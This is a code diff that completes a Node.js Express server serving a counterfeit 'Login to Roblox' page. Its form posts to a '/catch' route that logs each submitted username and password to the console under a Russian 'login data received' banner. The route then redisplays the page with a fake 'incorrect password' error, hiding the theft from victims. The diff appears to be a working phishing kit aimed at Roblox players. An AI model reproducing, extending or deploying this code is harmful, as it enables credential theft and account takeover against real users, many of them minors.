@@ -128,4 +128,58 @@ function getLoginPage(showError = false) {
         }
 
         .signup-text a {
-            color: #
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-text a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <h1>Login to Roblox</h1>
+        
+        <form action="/catch" method="POST">
+            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
+            <input type="password" name="password" class="input-control" placeholder="Password" required>
+            <div class="error-message">Incorrect username or password.</div>
+            <button type="submit" class="btn-submit">Log In</button>
+        </form>
+
+        <a href="#" class="link-text">Forgot Password or Username?</a>
+        
+        <div class="secondary-actions">
+            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
+            <button type="button" class="btn-secondary">Quick Sign-In</button>
+        </div>
+        
+        <div class="signup-text">
+            Don't have an account? <a href="#">Sign Up</a>
+        </div>
+    </div>
+</body>
+</html>
+    `;
+}
+
+app.get('/', (req, res) => {
+    res.send(getLoginPage(false));
+});
+
+app.post('/catch', (req, res) => {
+    const login = req.body.username;
+    const pass = req.body.password;
+
+    console.log(`\n==============================`);
+    console.log(`[ПОЛУЧЕНЫ ДАННЫЕ ВХОДА]`);
+    console.log(`Логин (Имя пользователя): ${login}`);
+    console.log(`Пароль: ${pass}`);
+    console.log(`==============================`);
+
+    res.send(getLoginPage(true));
+});
+
+app.listen(PORT, () => {
+    console.log(`=== СЕРВЕР РАБОТАЕТ НА ПОРТУ ${PORT} ===`);
+});
